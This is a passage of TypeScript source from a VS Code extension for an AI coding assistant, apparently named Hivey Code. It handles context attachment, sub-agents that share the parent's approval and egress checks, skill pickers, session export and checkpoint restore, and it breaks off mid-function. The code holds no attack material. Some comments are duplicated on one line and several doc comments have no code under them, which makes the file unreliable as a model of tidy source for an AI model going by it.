  private async attach(what: "active" | "editor" | "selection" | "browse" | "openFiles" | "mention"): Promise<void> {
    const settings = readSettings();
    switch (what) {
      case "active":
      case "selection": {
        const item = this.workspace.activeContext();
        if (item) this.attachments.push(item);
        break;
      }
      case "editor": {
        // The whole file, whatever is selected. `active` hands back the selection when there is
        // one, so with three lines highlighted there was no way to attach the file they are in —
        // which is the case where you most want to.
        const item = this.workspace.activeFileContext();
        if (item) this.attachments.push(item);
        break;
      }
      case "browse": {
        const picked = await vscode.window.showOpenDialog({ canSelectMany: true, openLabel: "Joindre" });
        for (const uri of picked ?? []) {
          const item = await this.workspace.fileContext(uri, settings);
          if (item) this.attachments.push(item);
        }
        break;
      }
      case "openFiles": {
        // The tabs' own URIs, not a relative path rebuilt against the first workspace folder.
        //
        // Two ways that failed, and both were silent. With no folder open it stopped before
        // attaching anything at all — `if (!folder) break` — so someone working on loose files got
        // nothing. And `asRelativePath` returns an ABSOLUTE path for a file outside the workspace,
        // which joined onto the folder's URI produces a path pointing nowhere. The count said "12
        // open editors" both times and the result was empty, which is exactly how this was
        // reported, twice.
        const uris = openFileUris();
        let added = 0;
        for (const uri of uris) {
          const item = await this.workspace.fileContext(uri, settings);
          if (item && !this.attachments.some((a) => a.label === item.label)) {
            this.attachments.push(item);
            added += 1;
          }
        }
        // Said out loud when nothing came of it. Silence is what made this look broken rather than
        // empty — and "empty" has causes the user can act on: no tabs, or a privacy rule.
        if (!added) {
          void vscode.window.showInformationMessage(
            uris.length
              ? t("Those {0} file(s) are already attached, or excluded by the privacy policy.", uris.length)
              : t("No file is open in a tab."),
          );
        }
        break;
      }
      case "mention": {
        await this.searchAttachment("both");
        return;
      }
    }
    this.sendState();
  }

  private async loadModels(force = false): Promise<void> {
    if (this.modelsLoading) return;
    this.modelsLoading = true;
    this.sendState();
    try {
      const settings = readSettings();
      this.models = await listModels(settings, this.keys, settings.chat.model);
    } catch (err) {
      this.log.appendLine(`[models] ${(err as Error).message}`);
    } finally {
      this.modelsLoading = false;
      this.sendState();
    }
    if (force) this.post({ type: "status", text: t("{0} models", this.models.length) });
  }

  /**
   * Write the conversation out as Markdown.
   *
   * Exported from the transcript rather than from the prompt, and the difference is the point: what
   * is saved is what the user read, including the exchanges they muted — which the model never
   * saw. A file that silently dropped them would be a record of a conversation nobody had.
   */
  /**
   * Run a sub-agent the repository defines.
   *
   * A nested turn with a narrower tool set and its own prompt — and with the SAME approver, the
   * same egress gate and the same vault as its parent. Being called by a sub-agent is not a way
   * around a dialog: a tool that asks before writing still asks, and what leaves the machine is
   * pseudonymised on exactly the same path.
   *
   * The sub-agent sees only the task it was given. That is the point of one: it starts on a clean
   * context, so a long conversation does not have to be re-read to answer a small question.
   */
  private async runSubAgent(
    run: SubAgentRun,
    env: {
      settings: Settings;
      providerId: Parameters<typeof providerFor>[2];
      model: string;
      baseUrl: string;
      isLocal: boolean;
      vault: Vault;
      allTools: Tool[];
      mode: Mode;
    },
  ): Promise<string> {
    const { definition } = run;
    const model = definition.model || env.model;
    const provider = await providerFor(env.settings, this.keys, env.providerId);
    const allowed = new Set(definition.tools);
    const tools = toolsForMode(env.allTools, env.mode).filter((tool) => allowed.has(tool.schema.name));

    const messages = [
      { role: "system" as const, content: definition.body, cacheable: true },
      { role: "user" as const, content: run.task },
    ];
    const prepared = env.isLocal
      ? { messages }
      : await this.gate.prepare(
          messages,
          env.settings,
          { provider: env.providerId, model, baseUrl: env.baseUrl, isLocal: env.isLocal },
          env.vault,
        );
    if (!prepared) return t("Refused: the sub-agent's request was not sent.");

    const result = await runTurn({
      provider,
      model,
      messages: prepared.messages,
      tools,
      maxSteps: definition.maxSteps ?? 8,
      ...(run.signal ? { signal: run.signal } : {}),
      approve: (req) => this.askApproval(req),
      beforeRequest: async (msgs) => {
        if (env.isLocal) return msgs;
        const again = await this.gate.prepare(
          msgs,
          env.settings,
          { provider: env.providerId, model, baseUrl: env.baseUrl, isLocal: env.isLocal },
          env.vault,
        );
        if (!again) throw new Error(t("Request refused: the rest of the turn was not sent."));
        return again.messages;
      },
      afterResponse: (text) => env.vault.restore(text),
      report: (message) => run.report(`${definition.name}: ${message}`),
    });
    return result.text;
  }

  /**
   * Tell the user about a definition file that could not be read.
   *
   * Skipping it silently is the worst outcome: the assistant ignores instructions it never
   * received, and nobody can find out why.
   */
  private reportDefinitionProblems(problems: string[]): void {
    const first = problems[0]!;
    const more = problems.length > 1 ? t(" (and {0} more)", problems.length - 1) : "";
    const open = t("Open the file");
    void vscode.window.showWarningMessage(`${first}${more}`, open).then((choice) => {
      if (choice !== open) return;
      const folder = vscode.workspace.workspaceFolders?.[0];
      const path = first.split(":")[0];
      if (folder && path) {
        void vscode.window.showTextDocument(vscode.Uri.joinPath(folder.uri, path));
      }
    });
  }

  /**
   * Whether the configured model could not answer if asked.
   *
   * A remote provider with no key in the keychain is the case that matters: the conversation looks
   * ready, the first question fails, and the error names a setting rather than a thing to do. Better
   * to open on the screen that fixes it. A local endpoint is not checked here — probing takes long
   * enough to be felt on activation, and a local endpoint that is merely not running yet is a
   * temporary state, not a misconfiguration.
   */
  private async cannotAnswer(): Promise<boolean> {
    const settings = readSettings();
    const provider = settings.chat.provider;
    if (provider === "local") return false;
    if (provider === "openai-compatible" && !settings.endpoints["openai-compatible"]) return true;
    return !(await this.keys.get(provider));
  }

  /**
   * Reveal the panel from a command, without choosing a side for the user.
   *
   * The whole implementation is `focus()`; what this adds is that the extension has exactly one
   * way to bring the panel forward. The previous arrangement had two — a helper in `extension.ts`
   * that picked the visible copy, and a hard-coded command inside `show()` that undid its choice a
   * line later — which is why the panel kept jumping back to the left.
   */
  async reveal(): Promise<void> {
    await this.focus();
  }

  /**
   * Attach every open tab, and say how many landed.
   *
   * A command as well as a menu row, for two reasons. It is worth having on a keybinding — it is
   * the commonest bulk attachment there is. And it is the only way this path could be tested end to
   * end: the menu row is a closure inside a quick pick, and a quick pick cannot be driven from a
   * test, which is why three separate failures in this one feature were each found by a person
   * rather than by the suite.
   */
  async attachOpenEditors(): Promise<number> {
    const before = this.attachments.length;
    await this.attach("openFiles");
    return this.attachments.length - before;
  }

  /**
   * One of the four lists, rewritten.
   *
   * Written to the WORKSPACE when there is one, because a denied path is usually about this
   * repository — `migrations/**` means nothing in the next project — while the scope above it is a
   * habit and stays global. Falling back to global when no folder is open, since the alternative is
   * a write that throws.
   */
  private async updatePolicyList(list: PolicyList, change: (current: string[]) => string[]): Promise<void> {
    const config = vscode.workspace.getConfiguration(SECTION);
    const key = `permissions.${list}`;
    const current = config.get<string[]>(key, []);
    await config.update(key, change(current), writeTarget());
    this.sendState();
  }

  /** Begin the guided start, from the title bar's `+`. */
  startWizard(): void {
    void this.onMessage({ type: "startWizard" });
  }

  /**
   * Every skill the panel may offer, with the user's switch on each.
   *
   * Built-ins and repository skills in one list, because from where the user stands they are one
   * idea — a named thing `/` invokes — and the only difference that matters to them is that one
   * kind can be opened and edited. The repository ones are loaded fresh rather than cached: a
   * colleague's skill arriving with a `git pull` should appear without reloading the window.
   */
  private skillsCache: UiSkill[] = [];

  private uiSkills(): UiSkill[] {
    const policy = readSettings().skills;
    // Only the families in play. A picker listing seventy skills of which sixty belong to languages
    // this project does not contain is a picker nobody reads to the end.
    const builtins = BUILTIN_SKILLS.filter((sk) => policy.groups.includes(sk.group)).map((sk) => ({
      name: sk.name,
      description: sk.hint,
      enabled: isSkillEnabled(sk.name, policy),
      builtin: true,
      group: sk.group,
      groupLabel: SKILL_GROUPS.find((g) => g.id === sk.group)?.label ?? sk.group,
      ...(ALWAYS_ON.has(sk.name) ? { required: true } : {}),
    }));
    // The repository's own, from the last load. Refreshing them is asynchronous and this is called
    // on every state send, so the list is filled in by `refreshSkills` rather than awaited here —
    // a panel that blocked on the file system every keystroke would be a panel that stutters.
    const repo = this.skillsCache.map((sk) => ({ ...sk, enabled: isSkillEnabled(sk.name, policy.disabled) }));
    return [...builtins, ...repo];
  }

  /**
   * The families, with what is on and what the workspace looks like.
   *
   * The suggestion comes from the languages the editor has OPEN rather than from a scan of the
   * repository, and that is the better signal: a monorepo contains eight languages and the person
   * in front of it is working on one of them today. It is only ever a pre-ticked answer — the
   * question is asked, never assumed, and answering it costs nothing because nothing is sent
   * anywhere to compute it.
   */
  private uiSkillGroups(): UiSkillGroup[] {
    const active = new Set(readSettings().skills.groups);
    const suggested = new Set(detectGroups(openFiles().map((f) => f.language)));
    return SKILL_GROUPS.map((g) => ({
      id: g.id,
      label: g.label,
      hint: g.hint,
      skills: BUILTIN_SKILLS.filter((sk) => sk.group === g.id).length,
      active: active.has(g.id),
      suggested: suggested.has(g.id),
    }));
  }

  /**
   * The question an answer belongs to, when that question can be rolled back.
   *
   * The checkpoint lives on the user entry — that is where the rewind goes to — but the affordance
   * has to appear on both, because "undo that" is a thought people have while looking at the reply.
   */
  private restoreTarget(entry: Entry): { restoreId?: string; checkpointFiles?: number; checkpointPartial?: boolean } {
    if (entry.role !== "assistant") return {};
    const i = this.session.entries.findIndex((e) => e.id === entry.id);
    for (let j = i - 1; j >= 0; j--) {
      const previous = this.session.entries[j]!;
      if (previous.role !== "user") continue;
      // The count travels with the id. Without it the rule under the answer said "0 files", which
      // is both wrong and exactly the kind of number that stops anyone trusting the button.
      if (!previous.checkpoint?.length) return {};
      return {
        restoreId: previous.id,
        checkpointFiles: previous.checkpoint.length,
        ...(previous.checkpointPartial ? { checkpointPartial: true } : {}),
      };
    }
    return {};
  }

  /**
   * Files this session has attached, newest first.
   *
   * Not persisted and deliberately short. What it answers is "the file I keep coming back to in
   * this conversation", which is a question about the last twenty minutes; a list restored from
   * last month would be a list of files that have since been renamed.
   */
  /**
   * The guided start, while it is running.
   *
   * Held here rather than in the session because it is not part of the conversation: nothing it
   * produces is a message, and a conversation exported or reopened later shows no trace of it.
   */
  private wizard: { step: "mode" | "family" | "skills" | "ready"; mode?: Mode; families: SkillGroup[] } | undefined;

  private uiWizard(): UiWizard {
    const w = this.wizard!;
    const policy = { groups: normaliseGroups(w.families), disabled: readSettings().skills.disabled };
    return {
      step: w.step,
      ...(w.mode ? { mode: w.mode } : {}),
      families: w.families,
      // Only the chosen families' skills, and only at the step that asks about them. Sending the
      // whole catalogue would be seventy rows for a question about four.
      skills:
        w.step === "skills"
          ? BUILTIN_SKILLS.filter((sk) => policy.groups.includes(sk.group) && !ALWAYS_ON.has(sk.name)).map((sk) => ({
              name: sk.name,
              description: sk.hint,
              enabled: isSkillEnabled(sk.name, policy),
              builtin: true,
              group: sk.group,
              groupLabel: SKILL_GROUPS.find((g) => g.id === sk.group)?.label ?? sk.group,
            }))
          : [],
    };
  }

  /** The label of the suggestion the user waved away. Cleared by opening a different file. */
  private implicitDismissed: string | undefined;

  private recentAttachments: string[] = [];

  private remember(path: string): void {
    this.recentAttachments = [path, ...this.recentAttachments.filter((p) => p !== path)].slice(0, 12);
  }

  /** Re-read the repository's skills, then redraw. Called on activation and after an edit. */  /** Re-read the repository's skills, then redraw. Called on activation and after an edit. */  /** Re-read the repository's skills, then redraw. Called on activation and after an edit. */  /** Re-read the repository's skills, then redraw. Called on activation and after an edit. */
  private async refreshSkills(): Promise<void> {
    const found = await this.definitions.load();
    const next = found.skills.map((sk) => ({
      name: skillInvocation(sk.name),
      description: sk.description,
      enabled: true,
      builtin: false,
      source: sk.source,
    }));
    // Only redraw when something actually changed: this runs on a file watcher, and a panel that
    // rebuilds itself every time anything under `.hiveycode/` is touched loses the caret.
    if (JSON.stringify(next) === JSON.stringify(this.skillsCache)) return;
    this.skillsCache = next;
    this.sendState();
  }

  /** Reopens the first-run screen and re-probes, from the command palette. */
  openSetup(): void {
    this.screen = "setup";
    this.sendState();
    void this.probeLocal();
  }

  /** Opens the in-conversation search, from the title bar or a keybinding. */
  openSearch(): void {
    this.screen = "chat";
    this.sendState();
    this.post({ type: "openSearch" });
  }

  /** Opens the model picker inside the panel, from a command or a keybinding. */
  openModelPicker(): void {
    this.screen = "chat";
    this.sendState();
    this.post({ type: "openModelPicker" });
  }

  async exportSession(): Promise<void> {
    const lines: string[] = [`# ${this.session.title || t("Conversation")}`, ""];
    for (const entry of this.session.entries) {
      lines.push(`## ${entry.role === "user" ? t("You") : "Hivey Code"}${entry.included ? "" : ` — ${t("out of context")}`}`);
      if (entry.role === "assistant" && entry.model) lines.push(`*${entry.model}*`, "");
      lines.push(entry.text.trim(), "");
      for (const step of entry.steps ?? []) lines.push(`- \`${step.tool}\` — ${step.summary}`);
      if (entry.steps?.length) lines.push("");
    }
    const doc = await vscode.workspace.openTextDocument({ language: "markdown", content: lines.join("\n") });
    await vscode.window.showTextDocument(doc);
  }

  /**
   * Replace the conversation so far with a summary of it.
   *
   * The idea is the CLI's `/compact`, and it fits this product better than it fits the one it comes
   * from, because the machinery already exists: muting an exchange keeps it on screen and takes it
   * out of the prompt. So compacting deletes nothing. It adds one summary the model wrote, mutes
   * everything the summary covers, and leaves the whole transcript there to scroll back through —
   * the user can unmute any of it, and the summary can be dropped like any other message.
   *
   * Run without tools and without the repository map: this is a turn ABOUT the conversation, and
   * giving it the ability to go and read files would let a summary invent material that was never
   * discussed. It still passes the egress gate and the budget, because it is still a request that
   * leaves the machine.
   */
  /**
   * Handing your skills to somebody else.
   *
   * There is nothing to invent here, and that is the answer rather than a limitation: a skill is a
   * Markdown file in `.hiveycode/skills/`, so sharing one is committing it — it arrives with a
   * clone, is reviewed like code, and cannot go stale relative to the repository it describes. That
   * was the whole argument for using files instead of settings, and a bespoke export format would
   * quietly undo it.
   *
   * So this does the two things the argument leaves undone: it shows the folder, and for anyone
   * outside the repository it copies the skills as one Markdown document that can be pasted into a
   * message. No upload, no account, no registry — none of which this extension has any business
   * running.
   */
  /**
   * Put the files back as they were before a question, and rewind the conversation to it.
   *
   * Confirmed first, and the confirmation names what will happen rather than asking "are you sure":
   * this OVERWRITES files, including any hand edits made since, which is the only part of this
   * feature that can lose work. Stating it beforehand is the difference between a rollback and a
   * trap.
   *
   * The writes go through a `WorkspaceEdit`, so restoring lands in the editor's own undo stack —
   * undoing a rollback is Ctrl+Z, the same as undoing anything else. Doing it with `fs.writeFile`
   * would have made the one operation designed to recover from a mistake the one operation you
   * cannot take back.
   */
  /**
   * Adding context, in the editor's own picker.
   *
   * This was a menu drawn inside the webview, and it was the wrong shape twice over. It could not
   * offer what the editor offers — no icons from the product's own set, no separators, no type-ahead
   * over categories — and it was one more surface behaving almost, but not quite, like the rest of
   * the workbench. A quick pick is the control VS Code uses for exactly this question, so it is
   * keyboard-navigable, themed and familiar for free.
   *
   * The categories follow the editor's chat because they follow the question people are actually
   * answering: is the thing I want open in front of me, somewhere in the repository, part of the
   * project's own rules, or something we discussed before.
   */
  private async contextPicker(): Promise<void> {
    type Row = vscode.QuickPickItem & { run?: () => Promise<void> | void };
    const rows: Row[] = [];
    const sep = (label: string): Row => ({ label, kind: vscode.QuickPickItemKind.Separator });

    // Each group is built in its own try. One of them reads the file system, another asks a
    // language server, another lists tabs — and a failure in any of those used to take the whole
    // picker with it, which is what "half the options have gone" looks like from the outside. A
    // group that cannot be built is missing; the rest still opens.
    const group = (build: () => void) => {
      try {
        build();
      } catch (err) {
        this.log.appendLine(`[context] ${(err as Error).message}`);
      }
    };

    const active = activeEditor();
    const files = openFiles();

    group(() => {
      rows.push(sep(t("The editor")));
      if (active?.hasSelection) {
        rows.push({
          label: "$(selection) " + t("This selection"),
          description: `${active.path} · ${active.selectedLines} ${active.selectedLines === 1 ? t("line") : t("lines")}`,
          run: () => this.attach("selection"),
        });
      }
      if (active) {
        rows.push({
          label: "$(file-code) " + t("This file"),
          description: active.path,
          run: () => this.attach("editor"),
        });
      }
      // Always offered, and empty is said rather than hidden: a row that vanishes when there is
      // nothing to attach is indistinguishable from a feature that has been removed, which is
      // exactly how this was reported.
      rows.push({
        label: "$(files) " + (files.length ? t("All {0} open editors", files.length) : t("All open editors")),
        description: files.length ? t("~{0} tokens", Math.round(files.length * 1200)) : t("No editor is open"),
        ...(files.length ? { run: () => this.attach("openFiles") } : {}),
      });
      if (files.length > 1) {
        rows.push({
          label: "$(list-selection) " + t("Choose from the open editors…"),
          description: t("Tick the ones you want"),
          run: () => this.pickOpenEditors(),
        });
      }
    });

    // The tabs themselves, right here. Two clicks to attach one open file was one more than the
    // old webview menu needed, and that menu listed them inline for a reason: picking the file you
    // are switching between is the commonest thing anyone does with this.
    group(() => {
      if (!files.length) return;
      rows.push(sep(t("Open editors ({0})", files.length)));
      for (const f of files.slice(0, 15)) {
        rows.push({
          label: "$(file) " + f.path,
          description: f.active ? t("active") : f.dirty ? t("edited") : "",
          run: () => this.onMessage({ type: "attachPath", path: f.path }),
        });
      }
    });

    group(() => {
      rows.push(sep(t("Files & folders")));
      rows.push({
        label: "$(search) " + t("Files…"),
        description: t("Search the whole workspace"),
        run: () => this.searchAttachment("files"),
      });
      rows.push({
        label: "$(symbol-method) " + t("Symbols…"),
        description: t("A class, a function, a procedure — its lines, not its file"),
        run: () => this.searchAttachment("symbols"),
      });
      rows.push({
        label: "$(folder-opened) " + t("Import from disk…"),
        description: t("Even outside the workspace"),
        run: () => this.attach("browse"),
      });
    });

    group(() => {
      const recentFiles = this.recentAttachments.filter((path) => !files.some((f) => f.path === path)).slice(0, 6);
      if (!recentFiles.length) return;
      rows.push(sep(t("Recent")));
      for (const path of recentFiles) {
        rows.push({ label: "$(history) " + path, run: () => this.onMessage({ type: "attachPath", path }) });
      }
    });

    group(() => {
      rows.push(sep(t("The repository")));
      for (const [icon, label, kind] of [
        ["$(list-tree)", t("Codebase"), "codebase"],
        ["$(git-compare)", t("Changes"), "changes"],
        ["$(warning)", t("Problems"), "problems"],
        ["$(terminal)", t("Terminal selection"), "terminal"],
      ] as const) {
        rows.push({ label: `${icon} ${label}`, run: () => this.attachMention(kind) });
      }
    });

    // Asynchronous, so it is resolved before the loop rather than inside it — a `group` callback
    // that returned a promise would be a group whose failures nothing catches.
    let instructions: string[] = [];
    try {
      instructions = await instructionFiles();
    } catch {
      /* no folder, or unreadable: the group simply does not appear */
    }
    group(() => {
      if (!instructions.length) return;
      rows.push(sep(t("Instructions")));
      for (const path of instructions) {
        rows.push({
          label: "$(law) " + path,
          description: t("The rules this repository sets for the assistant"),
          run: () => this.onMessage({ type: "attachPath", path }),
        });
      }
    });

    group(() => {
      const conversations = this.history()
        .filter((x) => x.id !== this.session.id)
        .sort((a, b) => b.updatedAt - a.updatedAt)
        .slice(0, 8);
      if (!conversations.length) return;
      rows.push(sep(t("Conversations")));
      for (const row of conversations) {
        rows.push({
          label: "$(comment-discussion) " + (row.title || t("untitled")),
          description: t("{0} messages", row.entries.length),
          run: () => this.onMessage({ type: "useSessionAsContext", id: row.id }),
        });
      }
    });

    const picked = await vscode.window.showQuickPick(rows, {
      placeHolder: t("Add context to the next question"),
      matchOnDescription: true,
    });
    await picked?.run?.();
  }

  /**
   * Which of the open tabs to attach.  /**
   * Which of the open tabs to attach.
   *
   * "All of them" and "this one" were the only two offers, and between a dozen tabs and one file
   * there is an obvious middle that came up constantly: the four files this question is actually
   * about. A multi-select over the tabs is that middle, and it costs one screen.
   */
  private async pickOpenEditors(): Promise<void> {
    const files = openFiles();
    if (!files.length) return;
    const picked = await vscode.window.showQuickPick(
      files.map((f) => ({
        label: f.path,
        description: f.active ? t("active") : f.dirty ? t("edited") : "",
        // The tabs in front of you are ticked to start with only if there is exactly one; with a
        // dozen open, pre-ticking them all would make "choose" mean "untick eleven".
        picked: files.length === 1,
        path: f.path,
      })),
      { canPickMany: true, placeHolder: t("Which open editors to attach?"), matchOnDescription: true },
    );
    if (!picked?.length) return;
    // By URI, for the same reason `openFiles` above does: a path is only re-joinable when the file
    // is inside the workspace, and the picker offers every tab.
    const byPath = new Map(openFileUris().map((uri) => [vscode.workspace.asRelativePath(uri, false), uri]));
    for (const row of picked) {
      const uri = byPath.get(row.path);
      if (!uri) continue;
      const item = await this.workspace.fileContext(uri, readSettings());
      if (item && !this.attachments.some((a) => a.label === item.label)) this.attachments.push(item);
      this.remember(row.path);
    }
    this.sendState();
  }

  /**
   * One mention, resolved as if it had been typed.
   *
   * The picker and the `#` notation must not be two implementations of "attach the diff": they
   * would drift, and the one nobody uses would be the one that breaks. Both go through
   * `resolveMentions`, which is also what applies the privacy policy.
   */
  private async attachMention(kind: MentionKind): Promise<void> {
    const settings = readSettings();
    const items = await resolveMentions([{ kind, raw: `#${kind}` }], {
      workspace: this.workspace,
      settings,
      repoMap: () => this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4)),
    });
    this.attachments.push(...items);
    this.sendState();
  }

  /**
   * Switching skills on and off, in the editor's own picker.
   *
   * A multi-select quick pick, which is the control VS Code uses for exactly this — its own
   * "Configure Tools" is one. Picking is the whole interaction: what is ticked when the list is
   * accepted is what is on, so there is no per-row save and nothing to get out of step.
   */
  /**
   * What Hivey Code may reach for, in two levels rather than one list.
   *
   * One list held eighteen family rows, then every skill of every active family under its own
   * separator, then the sub-agents — forty-odd rows in which the headings are the only thing
   * distinguishing three quite different kinds of decision, and VS Code draws a separator as a thin
   * line with small grey text. The result was unreadable, and it was unreadable because it was
   * answering three questions at once.
   *
   * So: which areas, which skills, which sub-agents. Each is one screen with one kind of thing on
   * it, and the first screen says how many are on in each — which is the summary the flat list
   * could never show.
   */
  private async toolsPicker(): Promise<void> {
    // Loops back to the top after each choice, rather than closing.
    //
    // Configuring these is rarely one decision: you pick the areas, and the skills you then want to
    // see are the ones that just appeared. Closing after each step meant reopening the menu and
    // finding your place again, three times, to make what is really one adjustment. Escape at the
    // top level leaves; escape inside a step comes back here, which is the same gesture meaning the
    // same thing at both levels.
    for (;;) {
      const again = await this.toolsStep();
      if (!again) return;
    }
  }

  /** One pass of the menu. Returns true when the user should be offered it again. */
  private async toolsStep(): Promise<boolean> {
    const settings = readSettings();
    const skills = this.uiSkills();
    const found = await this.definitions.load();

    const activeFamilies = settings.skills.groups.filter((g) => g !== "general").length;
    const skillsOn = skills.filter((sk) => sk.enabled).length;
    const agentsOn = found.agents.filter((a) => !settings.agents.disabled.includes(a.name)).length;

    const chosen = await vscode.window.showQuickPick(
      [
        {
          label: "$(folder) " + t("Areas"),
          description: activeFamilies ? t("{0} chosen", activeFamilies) : t("none chosen"),
          detail: t("Which languages and subjects this conversation is about"),
          id: "families" as const,
        },
        {
          label: "$(symbol-event) " + t("Skills"),
          description: t("{0} in play", skillsOn),
          detail: t("The `/` commands offered, within the areas you chose"),
          id: "skills" as const,
        },
        {
          label: "$(person) " + t("Sub-agents"),
          description: t("{0} in play", agentsOn),
          detail: t("Each runs on its own, with its own tools, and reports back"),
          id: "agents" as const,
        },
      ],
      { placeHolder: t("What Hivey Code may reach for") },
    );
    // Escape at the top level is the way out.
    if (!chosen) return false;

    const config = vscode.workspace.getConfiguration(SECTION);

    if (chosen.id === "families") {
      const picked = await vscode.window.showQuickPick(
        SKILL_GROUPS.filter((g) => g.id !== "general").map((g) => ({
          label: g.label,
          description: t("{0} skills", BUILTIN_SKILLS.filter((sk) => sk.group === g.id).length),
          detail: g.hint,
          id: g.id,
          picked: settings.skills.groups.includes(g.id),
        })),
        {
          canPickMany: true,
          placeHolder: t("Which areas is this conversation about?"),
          matchOnDetail: true,
        },
      );
      if (picked) {
        await config.update(
          "skills.groups",
          normaliseGroups(picked.map((row) => row.id)),
          vscode.ConfigurationTarget.Global,
        );
        this.sendState();
      }
      return true;
    }

    if (chosen.id === "skills") {
      type Row = vscode.QuickPickItem & { name?: string };
      const rows: Row[] = [];
      for (const group of SKILL_GROUPS) {
        const list = skills.filter((sk) => sk.builtin && sk.group === group.id);
        if (!list.length) continue;
        rows.push({ label: group.label, kind: vscode.QuickPickItemKind.Separator });
        for (const sk of list) {
          rows.push({
            label: sk.name,
            description: sk.description,
            ...(sk.required ? { detail: t("Always available: it is how you free a full context.") } : {}),
            name: sk.name,
            picked: sk.enabled,
          });
        }
      }
      const repo = skills.filter((sk) => !sk.builtin);
      if (repo.length) {
        rows.push({ label: t("Skills this repository defines"), kind: vscode.QuickPickItemKind.Separator });
        for (const sk of repo) {
          rows.push({ label: sk.name, description: sk.description, detail: sk.source, name: sk.name, picked: sk.enabled });
        }
      }
      if (!rows.length) {
        void vscode.window.showInformationMessage(t("Choose an area first — the skills follow from it."));
        return true;
      }
      const picked = await vscode.window.showQuickPick(rows, {
        canPickMany: true,
        placeHolder: t("Which skills are offered when you type “/”"),
        matchOnDescription: true,
      });
      if (picked) {
        const listed = new Set(rows.map((row) => row.name).filter(Boolean) as string[]);
        const on = new Set(picked.map((row) => row.name).filter(Boolean) as string[]);
        let disabled = settings.skills.disabled;
        for (const name of listed) disabled = toggleSkill(disabled, name, on.has(name));
        await config.update("skills.disabled", disabled, vscode.ConfigurationTarget.Global);
        this.sendState();
      }
      return true;
    }

    if (!found.agents.length) {
      void vscode.window.showInformationMessage(t("No sub-agent is defined."));
      return true;
    }
    const picked = await vscode.window.showQuickPick(
      found.agents.map((agent) => ({
        label: agent.name,
        description: agent.description,
        detail: agent.source === "built-in" ? t("built in") : agent.source,
        name: agent.name,
        picked: !settings.agents.disabled.includes(agent.name),
      })),
      { canPickMany: true, placeHolder: t("Which sub-agents may be dispatched?"), matchOnDescription: true },
    );
    if (picked) {
      const on = new Set(picked.map((row) => row.name));
      await config.update(
        "agents.disabled",
        found.agents.filter((a) => !on.has(a.name)).map((a) => a.name).sort(),
        vscode.ConfigurationTarget.Global,
      );
      this.sendState();
    }
    return true;
  }

  private async searchAttachment(mode: "files" | "symbols" | "both" = "both"): Promise<void> {
    const picker = vscode.window.createQuickPick<vscode.QuickPickItem & { path?: string; symbol?: vscode.SymbolInformation }>();
    picker.placeholder =
      mode === "files" ? t("Search files to attach…") : mode === "symbols" ? t("Search symbols to attach…") : t("Search files and symbols to attach…");
    picker.matchOnDescription = true;
    // The editor has already filtered by the time items arrive, and filtering again on a fuzzy
    // query written for a path removes matches the query was aimed at.
    picker.matchOnDetail = false;

    const load = async (query: string) => {
      picker.busy = true;
      try {
        const [files, symbols] = await Promise.all([
          mode === "symbols" ? Promise.resolve([]) : this.workspace.findFiles(query, 40),
          // Symbols only once there is something to look for: an empty workspace-symbol query asks
          // every language server for its entire index, which on a large repository is seconds.
          mode !== "files" && query.trim().length >= (mode === "symbols" ? 1 : 2)
            ? (vscode.commands.executeCommand<vscode.SymbolInformation[]>("vscode.executeWorkspaceSymbolProvider", query) ??
              Promise.resolve([]))
            : Promise.resolve([]),
        ]);
        picker.items = [
          ...files.map((path) => ({ label: `$(file) ${path}`, path })),
          ...(symbols ?? []).slice(0, 20).map((symbol) => ({
            label: `$(symbol-method) ${symbol.name}`,
            description: vscode.workspace.asRelativePath(symbol.location.uri, false),
            symbol,
          })),
        ];
      } catch {
        // A language server that is starting, or a query it dislikes. The file half still works,
        // and an empty picker would be a worse answer than a partial one.
      } finally {
        picker.busy = false;
      }
    };

    picker.onDidChangeValue((value) => void load(value));
    picker.onDidAccept(async () => {
      const picked = picker.selectedItems[0];
      picker.hide();
      if (!picked) return;
      if (picked.path) {
        await this.onMessage({ type: "attachPath", path: picked.path });
        return;
      }
      if (picked.symbol) {
        // A symbol attaches the lines it occupies rather than the whole file: a 3 000-line module
        // attached to answer a question about one method is most of a context window spent on
        // material nobody asked about.
        const item = await this.workspace.rangeContext(picked.symbol.location.uri, picked.symbol.location.range, readSettings());
        if (item) {
          this.attachments.push(item);
          this.sendState();
        }
      }
    });
    picker.onDidHide(() => picker.dispose());
    picker.show();
    await load("");
  }

  /**
   * Carry one message into another conversation.
   *
   * Copy-and-paste is what this replaces, and it loses the one thing worth keeping: that the text
   * was an ANSWER, produced by a named model, at a point in another conversation. Pasted back in it
   * arrives indistinguishable from the user's own words — which is exactly the confusion the
   * untrusted fence exists to prevent.
   *
   * So it travels as an attachment with its provenance attached, and it is fenced, for the same
   * reason a transcript is: an answer contains whatever the assistant read while producing it.
   */
  private async shareEntry(id: string): Promise<void> {
    const entry = this.session.get(id);
    if (!entry?.text.trim()) return;

    type Row = vscode.QuickPickItem & { target?: string };
    const others = this.history()
      .filter((x) => x.id !== this.session.id)
      .sort((a, b) => b.updatedAt - a.updatedAt)
      .slice(0, 12);
    const rows: Row[] = [
      { label: "$(add) " + t("A new conversation"), description: t("Started with this as its context"), target: "new" },
      ...(others.length ? [{ label: t("Existing"), kind: vscode.QuickPickItemKind.Separator } as Row] : []),
      ...others.map((x) => ({
        label: "$(comment-discussion) " + (x.title || t("untitled")),
        description: t("{0} messages", x.entries.length),
        target: x.id,
      })),
    ];

    const picked = await vscode.window.showQuickPick(rows, { placeHolder: t("Where should this go?") });
    if (!picked?.target) return;

    const item: ContextItem = {
      kind: "message",
      label: t("{0}, from “{1}”", entry.role === "user" ? t("You") : "Hivey Code", this.session.title || t("untitled")),
      body: entry.text,
      untrusted: true,
    };

    // The current conversation is saved before we leave it. Without this, sharing out of a
    // conversation that had not been persisted since its last turn would lose that turn.
    this.persist();
    if (picked.target === "new") {
      this.newSession();
    } else {
      const found = this.history().find((x) => x.id === picked.target);
      if (found) this.session = new Session(found);
    }
    this.attachments.push(item);
    this.screen = "chat";
    this.sendState();
    this.post({ type: "status", text: t("Attached here. Ask your question.") });
  }

  private async restoreCheckpoint(id: string): Promise<void> {
    const entry = this.session.get(id);
    if (!entry?.checkpoint?.length) return;
    const folder = vscode.workspace.workspaceFolders?.[0];
    if (!folder) {
      void vscode.window.showWarningMessage(t("Restoring needs the folder these files belong to open."));
      return;
    }

    const detail = describeRestore(entry.checkpoint, Boolean(entry.checkpointPartial), {
      files: (n) => t("{0} file(s) go back to how they were.", n),
      created: (n) => t("{0} file(s) created by that turn are deleted.", n),
